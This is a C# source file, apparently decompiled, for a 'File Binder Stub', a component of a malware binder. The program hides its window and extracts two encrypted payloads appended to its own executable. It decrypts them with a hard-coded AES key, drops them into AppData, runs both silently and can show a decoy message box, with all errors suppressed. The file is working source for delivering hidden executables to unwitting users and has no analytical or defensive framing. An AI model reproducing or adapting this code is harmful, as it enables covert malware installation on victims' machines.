using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace File_Binder_Stub;

public class frmMain : Form
{
	private IContainer components;

	private string f;

	private string f2;

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(34, 23));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_TransparencyKey(SystemColors.Control);
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}

	public frmMain()
	{
		InitializeComponent();
	}

	private static byte[] UnSecure(byte[] data)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] iV = new byte[16]
		{
			1, 2, 3, 4, 5, 6, 7, 8, 9, 1,
			2, 3, 4, 5, 6, 7
		};
		byte[] key = new byte[16]
		{
			7, 6, 5, 4, 3, 2, 1, 9, 8, 7,
			6, 5, 4, 3, 2, 1
		};
		rijndaelManaged.IV = iV;
		rijndaelManaged.Key = key;
		return rijndaelManaged.CreateDecryptor().TransformFinalBlock(data, 0, data.Length);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_00c4: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			string text = File.ReadAllText(Application.get_ExecutablePath());
			string[] separator = new string[1] { "[COITUSINTERRUPTUS555]" };
			string[] array = text.Split(separator, StringSplitOptions.None);
			byte[] bytes = UnSecure(Convert.FromBase64String(array[1]));
			byte[] bytes2 = UnSecure(Convert.FromBase64String(array[3]));
			File.WriteAllBytes(folderPath + "\\" + array[2], bytes);
			File.WriteAllBytes(folderPath + "\\" + array[4], bytes2);
			Process.Start(folderPath + "\\" + array[2]);
			Process.Start(folderPath + "\\" + array[4]);
			string text2 = array[5];
			string text3 = array[6];
			string text4 = array[7];
			if (text2 == "Y")
			{
				MessageBox.Show(text3, text4, (MessageBoxButtons)0, (MessageBoxIcon)64);
			}
		}
		catch
		{
		}
		Application.Exit();
	}
}
